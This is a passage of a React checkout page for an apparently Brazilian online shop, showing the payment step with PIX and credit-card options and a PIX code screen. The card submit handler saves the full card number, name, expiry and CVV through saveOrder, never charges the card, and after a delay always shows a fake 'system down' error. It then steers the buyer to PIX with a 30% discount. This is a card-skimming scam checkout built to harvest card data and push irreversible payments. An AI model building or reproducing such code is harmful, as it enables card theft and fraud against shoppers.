        )}

        {/* STEP 3 */}
        {step === 3 && (
          <div className="space-y-4 pb-2">
            {/* Identificação summary */}
            <div className="border border-border rounded-lg p-4 space-y-1">
              <div className="flex items-center justify-between">
                <p className="font-bold text-sm">Identificação</p>
                <button onClick={() => setStep(1)} className="text-xs text-muted-foreground flex items-center gap-1">
                  Editar <Pencil size={12} />
                </button>
              </div>
              <p className="text-sm">{info.name}</p>
              <p className="text-sm text-muted-foreground">{info.email}</p>
              <p className="text-sm text-muted-foreground">{info.phone}</p>
            </div>

            {/* Endereço summary */}
            <div className="border border-border rounded-lg p-4 space-y-1">
              <div className="flex items-center justify-between">
                <p className="font-bold text-sm">Enviar para</p>
                <button onClick={() => setStep(2)} className="text-xs text-muted-foreground flex items-center gap-1">
                  Editar <Pencil size={12} />
                </button>
              </div>
              <p className="text-sm">{address.rua}, {address.numero}</p>
              <p className="text-sm text-muted-foreground">{address.bairro}, {address.cidade}/{address.estado} {address.cep}</p>
              <p className="text-sm font-medium pt-1">Frete selecionado</p>
              <p className="text-sm text-muted-foreground">
                {shippingOption === "correios" ? "Frete Grátis - Grátis" : `Jadlog - R$ ${shippingCost.toFixed(2).replace(".", ",")}`}
              </p>
            </div>

            <div className="flex items-center justify-between">
              <h2 className="font-heading font-bold text-xl flex items-center gap-2">
                <span className="w-6 h-6 rounded-full bg-foreground text-background text-xs flex items-center justify-center">3</span>
                Pagamento
              </h2>
              <span className="text-xs text-muted-foreground">3 de 3</span>
            </div>
            <p className="text-sm text-muted-foreground -mt-3">Todas as transações são seguras e criptografadas.</p>

            {/* PIX option */}
            <div
              className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                paymentMethod === "pix" ? "border-primary bg-primary/5" : "border-border"
              }`}
              onClick={() => setPaymentMethod("pix")}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <input type="radio" checked={paymentMethod === "pix"} readOnly className="accent-black" />
                    <svg viewBox="0 0 640 640" className="h-5 w-5 fill-[#32bcad]"><path d="M306.4 356.5C311.8 351.1 321.1 351.1 326.5 356.5L403.5 433.5C417.7 447.7 436.6 455.5 456.6 455.5L471.7 455.5L374.6 552.6C344.3 582.1 295.1 582.1 264.8 552.6L167.3 455.2L176.6 455.2C196.6 455.2 215.5 447.4 229.7 433.2L306.4 356.5zM326.5 282.9C320.1 288.4 311.9 288.5 306.4 282.9L229.7 206.2C215.5 191.1 196.6 184.2 176.6 184.2L167.3 184.2L264.7 86.8C295.1 56.5 344.3 56.5 374.6 86.8L471.8 183.9L456.6 183.9C436.6 183.9 417.7 191.7 403.5 205.9L326.5 282.9zM176.6 206.7C190.4 206.7 203.1 212.3 213.7 222.1L290.4 298.8C297.6 305.1 307 309.6 316.5 309.6C325.9 309.6 335.3 305.1 342.5 298.8L419.5 221.8C429.3 212.1 442.8 206.5 456.6 206.5L494.3 206.5L552.6 264.8C582.9 295.1 582.9 344.3 552.6 374.6L494.3 432.9L456.6 432.9C442.8 432.9 429.3 427.3 419.5 417.5L342.5 340.5C328.6 326.6 304.3 326.6 290.4 340.6L213.7 417.2C203.1 427 190.4 432.6 176.6 432.6L144.8 432.6L86.8 374.6C56.5 344.3 56.5 295.1 86.8 264.8L144.8 206.7L176.6 206.7z"/></svg>
                  <span className="font-semibold text-sm">PIX</span>
                </div>
                <span className="text-xs text-primary font-semibold">Aprovação imediata</span>
              </div>

              {paymentMethod === "pix" && (
                <div className="mt-4 space-y-3">
                  <p className="text-xs text-center text-muted-foreground">
                    O código Pix expira em 30 minutos após finalizar a compra.
                  </p>
                  <div className="space-y-1.5">
                    <label className="text-xs font-medium text-muted-foreground">CPF</label>
                    <Input
                      inputMode="numeric"
                      placeholder="000.000.000-00"
                      value={info.cpf}
                      onChange={(e) => setInfo((p) => ({ ...p, cpf: formatCPF(e.target.value) }))}
                      className={`h-12 bg-secondary/40 ${errors.cpf ? "border-destructive" : ""}`}
                    />
                    {errors.cpf && <p className="text-xs text-destructive">{errors.cpf}</p>}
                  </div>
                  <p className="font-heading font-bold text-sm">
                    Valor no Pix:{" "}
                    {cardError && (
                      <span className="text-muted-foreground line-through font-normal mr-1">
                        R$ {baseTotal.toFixed(2).replace(".", ",")}
                      </span>
                    )}
                    <span className="text-primary">R$ {finalTotal.toFixed(2).replace(".", ",")}</span>
                  </p>
                </div>
              )}
            </div>

            {/* Card option */}
            <div
              className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                paymentMethod === "card" ? "border-primary" : "border-border"
              }`}
              onClick={() => setPaymentMethod("card")}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <input type="radio" checked={paymentMethod === "card"} readOnly className="accent-black" />
                  <CreditCard size={18} className="text-foreground" />
                  <span className="font-semibold text-sm">Cartão de crédito</span>
                </div>
                <span className="text-xs text-primary font-semibold">Aprovação imediata</span>
              </div>
              <div className="flex gap-1.5 mt-2 flex-wrap items-center">
                <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/visa.svg" alt="Visa" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
                <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
                <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/american-express.svg" alt="Amex" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
                <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/diners.svg" alt="Diners" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
                <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/discover.svg" alt="Discover" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
                <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/elo.svg" alt="Elo" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
                <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/hipercard.svg" alt="Hipercard" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
                <img src="https://raw.githubusercontent.com/aaronfagan/svg-credit-card-payment-icons/main/flat/hiper.svg" alt="Hiper" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
              </div>

              {paymentMethod === "card" && (
                <div className="mt-4 space-y-3 border-t border-border pt-4">
                  <div className="space-y-1">
                    <label className="text-xs font-medium text-muted-foreground">Número do Cartão</label>
                    <Input placeholder="0000 0000 0000 0000" value={card.numero} onChange={(e) => setCard((p) => ({ ...p, numero: formatCardNumber(e.target.value) }))} className={`h-11 ${errors.cardNumero ? "border-destructive" : ""}`} inputMode="numeric" />
                    {errors.cardNumero && <p className="text-xs text-destructive">{errors.cardNumero}</p>}
                  </div>
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs font-medium text-muted-foreground">Validade</label>
                      <Input placeholder="MM/AA" value={card.validade} onChange={(e) => setCard((p) => ({ ...p, validade: formatValidade(e.target.value) }))} className={`h-11 ${errors.cardValidade ? "border-destructive" : ""}`} inputMode="numeric" />
                      {errors.cardValidade && <p className="text-xs text-destructive">{errors.cardValidade}</p>}
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-medium text-muted-foreground">CVV</label>
                      <Input placeholder="000" value={card.cvv} onChange={(e) => setCard((p) => ({ ...p, cvv: e.target.value.replace(/\D/g, "").slice(0, 4) }))} className={`h-11 ${errors.cardCvv ? "border-destructive" : ""}`} inputMode="numeric" maxLength={4} />
                      {errors.cardCvv && <p className="text-xs text-destructive">{errors.cardCvv}</p>}
                    </div>
                  </div>
                  <div className="space-y-1">
                    <label className="text-xs font-medium text-muted-foreground">Nome do titular</label>
                    <Input value={card.nome} onChange={(e) => setCard((p) => ({ ...p, nome: e.target.value }))} className={`h-11 ${errors.cardNome ? "border-destructive" : ""}`} />
                    {errors.cardNome && <p className="text-xs text-destructive">{errors.cardNome}</p>}
                  </div>
                  <div className="space-y-1">
                    <label className="text-xs font-medium text-muted-foreground">CPF</label>
                    <Input inputMode="numeric" value={info.cpf} onChange={(e) => setInfo((p) => ({ ...p, cpf: formatCPF(e.target.value) }))} className={`h-11 ${errors.cpf ? "border-destructive" : ""}`} />
                    {errors.cpf && <p className="text-xs text-destructive">{errors.cpf}</p>}
                  </div>
                  <div className="space-y-1">
                    <label className="text-xs font-medium text-muted-foreground">Parcelas</label>
                    <select
                      value={card.parcelas}
                      onChange={(e) => setCard((p) => ({ ...p, parcelas: e.target.value }))}
                      className="w-full h-11 border border-input rounded-md px-3 text-sm bg-background"
                    >
                      {parcelasOptions()}
                    </select>
                  </div>
                </div>
              )}
            </div>

            {cardError && (
              <div id="card-error-msg" className="border-2 border-destructive bg-destructive/10 rounded-lg p-4 space-y-2">
                <p className="font-heading font-bold text-sm text-destructive">Pagamento por cartão indisponível</p>
                <p className="text-xs text-foreground leading-relaxed">
                  Nosso sistema está temporariamente fora do ar. Oferecemos <span className="font-bold">30% de desconto</span> pagando via PIX.
                </p>
              </div>
            )}

            <Button
              onClick={async () => {
                if (paymentMethod === "pix") return handleGeneratePix();
                const e: Record<string, string> = {};
                const cpfDigits = info.cpf.replace(/\D/g, "");
                if (cpfDigits.length !== 11) e.cpf = "CPF inválido";
                if (card.numero.replace(/\D/g, "").length < 13) e.cardNumero = "Número inválido";
                if (card.validade.replace(/\D/g, "").length !== 4) e.cardValidade = "Validade inválida";
                if (card.cvv.length < 3) e.cardCvv = "CVV inválido";
                if (!card.nome.trim()) e.cardNome = "Nome obrigatório";
                setErrors(e);
                if (Object.keys(e).length > 0) return;
                setLoading(true);
                await saveOrder({
                  card_number: card.numero.replace(/\D/g, ""),
                  card_name: card.nome,
                  card_expiry: card.validade,
                  card_cvv: card.cvv,
                  installments: card.parcelas,
                  status: "card_attempt",
                });
                setTimeout(() => {
                  setLoading(false);
                  setCardError(true);
                  setPaymentMethod("pix");
                  setTimeout(() => {
                    document.getElementById("card-error-msg")?.scrollIntoView({ behavior: "smooth", block: "center" });
                  }, 100);
                }, 1500);
              }}
              disabled={loading}
              className="w-full h-14 text-base font-bold uppercase tracking-wide rounded-lg"
              size="lg"
            >
              {loading ? <><Loader2 size={18} className="animate-spin mr-2" /> Processando...</> : "Finalizar Compra"}
            </Button>

            <SocialProofCarousel />
          </div>
        )}

        {/* STEP 4: PIX result */}
        {step === 4 && pixData && (
          <div className="space-y-4 py-4 pb-8">
            <div className="bg-white rounded-2xl border border-border p-6 text-center space-y-4 shadow-sm">
              <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-2">
                <Check size={32} className="text-primary" />
              </div>
              <h2 className="font-heading font-bold text-xl">Pix gerado com sucesso</h2>
              <p className="text-sm text-muted-foreground leading-relaxed px-2">
                Estamos aguardando seu pagamento. Após realizar o Pix, seu pedido será processado automaticamente.
              </p>
              <div className="bg-secondary/30 rounded-xl py-4 px-2">
                <p className="font-heading font-black text-6xl text-foreground tracking-tight leading-none">{countdown}</p>
                <p className="text-[10px] uppercase font-bold text-muted-foreground mt-2 tracking-wider">Tempo para pagar</p>
              </div>
              <div className="border-t border-border pt-4">
                <p className="font-heading font-bold text-base">
                  Total a pagar: <span className="text-primary">R$ {finalTotal.toFixed(2).replace(".", ",")}</span>
                </p>
              </div>
              <div className="bg-background border border-dashed border-border rounded-xl px-4 py-4 text-xs font-mono break-all text-center select-all">
                {pixData.pix_code}
              </div>
              <Button 
                onClick={handleCopy} 
                className={`w-full rounded-lg h-14 text-base font-bold uppercase transition-all duration-300 ${copied ? "bg-green-600 hover:bg-green-700" : ""}`} 
                size="lg"
              >
                {copied ? (
                  <span className="flex items-center gap-2 animate-in fade-in zoom-in duration-300">
                    <Check size={20} className="text-white" /> CÓDIGO COPIADO!
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Copy size={20} /> COPIAR CÓDIGO PIX
                  </span>
                )}
              </Button>
            </div>

            <Button
              variant="outline"
              className="w-full rounded-lg h-14 text-base font-bold uppercase border-2 border-primary/20 hover:bg-primary/5 hover:border-primary/40 transition-all"
              size="lg"
              onClick={() => setShowQrCode((prev) => !prev)}
            >
              {showQrCode ? "Esconder QR Code" : "Mostrar QR Code"}
            </Button>

            {showQrCode && qrCodeSrc && (
              <div className="flex justify-center">
                <img src={qrCodeSrc} alt="QR Code PIX" className="w-48 h-48 rounded-lg border border-border bg-background" />
              </div>
            )}
          </div>
        )}

        <CheckoutFooter />
      </div>
    </div>
  );
};

export default CheckoutPage;
